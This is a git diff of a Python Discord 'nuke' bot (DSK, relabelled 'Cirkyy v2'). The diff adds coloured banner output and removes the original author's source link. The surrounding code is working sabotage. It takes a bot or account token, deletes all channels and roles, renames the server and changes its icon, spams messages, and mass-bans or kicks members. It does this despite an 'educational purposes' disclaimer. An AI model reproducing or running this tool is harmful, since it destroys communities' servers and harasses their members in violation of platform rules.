@@ -4,19 +4,21 @@ from discord.ext import tasks
 import requests
 import base64
 import traceback
+import colorama
+from colorama import Fore, init, Style
 import os
 os.system('mode con: cols=155 lines=50')
 
 # CONFIG
 
-print(
-    ░█████╗░████████╗██████╗░░█████╗░██████╗░███████╗░██████╗
+print(f"""{Style.BRIGHT}{Fore.RED}
+░█████╗░████████╗██████╗░░█████╗░██████╗░███████╗░██████╗
 ██╔══██╗╚══██╔══╝██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔════╝
 ██║░░╚═╝░░░██║░░░██████╔╝███████║██║░░██║█████╗░░╚█████╗░
 ██║░░██╗░░░██║░░░██╔══██╗██╔══██║██║░░██║██╔══╝░░░╚═══██╗
 ╚█████╔╝░░░██║░░░██║░░██║██║░░██║██████╔╝███████╗██████╔╝
-░╚════╝░░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░╚══════╝╚═════╝░ )
-print('ℭ𝔦𝔯𝔨𝔶𝔶 v1\n')
+░╚════╝░░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░╚══════╝╚═════╝░ℭ𝔦𝔯𝔨𝔶𝔶 v2
+{Style.RESET_ALL}{Fore.WHITE}{Fore.RESET}""")
 
 print("DSK is SpamBot that you can run on bot user or own account. It will destroy given server with these steps:\n"
       " * Deleteing everything\n"
@@ -31,11 +33,11 @@ print("DSK is SpamBot that you can run on bot user or own account. It will destr
       " and I'm (Norxnd) not responsible for any damage caused by you!\nPlease use it for educational purposes, "
       "not to destroy someone's work!\nIm not evil for creating this, you are evil for using this.\nIf you server "
       "has been destroyed with this tool, blame person who used it, not me, and Im sorry!\n\n"
-      "Source code avieble at: https://gist.github.com/NORXND/a904f92ea2e3ff897b9612d37b948425 . "
-      "Made by NORXND, use it for good purposes.\n\n")
+      "Made by ℭ𝔦𝔯𝔨𝔶𝔶, use it for good purposes.\n\n")
 
 
-TOKEN = input("Enter the token of your bot or account (threatens with a ban) > ")
+TOKEN = input(
+    "Enter the token of your bot or account (threatens with a ban) > ")
 TOKEN = TOKEN.strip()
 print(f"[{datetime.now()} INFO]: The token has been entered.")
 
@@ -55,11 +57,13 @@ IMAGE_URL = input("Enter the URL to the new server image > ")
 IMAGE_URL = IMAGE_URL.strip()
 print(f"[{datetime.now()} INFO]: URL has been entered.")
 
-MESSAGE_CONTENT = input("Enter the text of the message to be sent to the chat > ")
+MESSAGE_CONTENT = input(
+    "Enter the text of the message to be sent to the chat > ")
 MESSAGE_CONTENT = MESSAGE_CONTENT.strip()
 print(f"[{datetime.now()} INFO]: The text has been entered.")
 
-BANKICK_CHOIICE = input("Do you want members to be ban [b] or kick [k] ? Or not [n] ? > ")
+BANKICK_CHOIICE = input(
+    "Do you want members to be ban [b] or kick [k] ? Or not [n] ? > ")
 BANKICK_CHOIICE = BANKICK_CHOIICE.strip()
 if BANKICK_CHOIICE == "b" or BANKICK_CHOIICE == "B":
     BANKICK_CHOIICE = 2
@@ -93,6 +97,7 @@ async def send(guild, wiad):
         except Exception:
             print(f"[{datetime.now()} WARN] {guild.id}: Message sending error!")
 
+
 @tasks.loop(count=1)
 async def kickorban(guild):
     if BANKICK_CHOIICE == 1:
@@ -101,14 +106,16 @@ async def kickorban(guild):
                 await member.kick()
             except Exception:
                 print(f"[{datetime.now()} WARN] {guild.id}: Member kicking error!")
-        print(f"[{datetime.now()} INFO] {guild.id}: All members that can be kick was kicked out.")
+        print(
+            f"[{datetime.now()} INFO] {guild.id}: All members that can be kick was kicked out.")
     elif BANKICK_CHOIICE == 2:
         for member in guild.members:
             try:
                 await member.ban()
             except Exception:
                 print(f"[{datetime.now()} WARN] {guild.id}: Members banning error!")
-        print(f"[{datetime.now()} INFO] {guild.id}: All members that can be banned was banned.")
+        print(
+            f"[{datetime.now()} INFO] {guild.id}: All members that can be banned was banned.")
     else:
         pass
 
@@ -124,12 +131,14 @@ async def start(guild):
         try:
             await x.delete()
         except Exception:
-            print(f"[{datetime.now()} WARN] {guild.id}: Error deleting text channels!")
+            print(
+                f"[{datetime.now()} WARN] {guild.id}: Error deleting text channels!")
     for x in server_cleanup['v']:
         try:
             await x.delete()
         except Exception:
-            print(f"[{datetime.now()} WARN] {guild.id}: Error deleting voice channels!")
+            print(
+                f"[{datetime.now()} WARN] {guild.id}: Error deleting voice channels!")
 
     for x in server_cleanup['r']:
         try:
@@ -156,7 +165,8 @@ async def start(guild):
         image_bytes = base64.b64encode(response.content)
         await guild.edit(icon=image_bytes)
     except Exception:
-        print(f"[{datetime.now()} WARN] {guild.id}: Error changing the server picture!")
+        print(
+            f"[{datetime.now()} WARN] {guild.id}: Error changing the server picture!")
 
     print(f"[{datetime.now()} INFO] {guild.id}: The server name and image has been changed.")
 
@@ -181,6 +191,7 @@ async def start(guild):
 
     print(f"[{datetime.now()} INFO] {guild.id}: The roles have been created.")
 # KOD NISZCZENIA
+
 
 @client.event
 async def on_message(message):
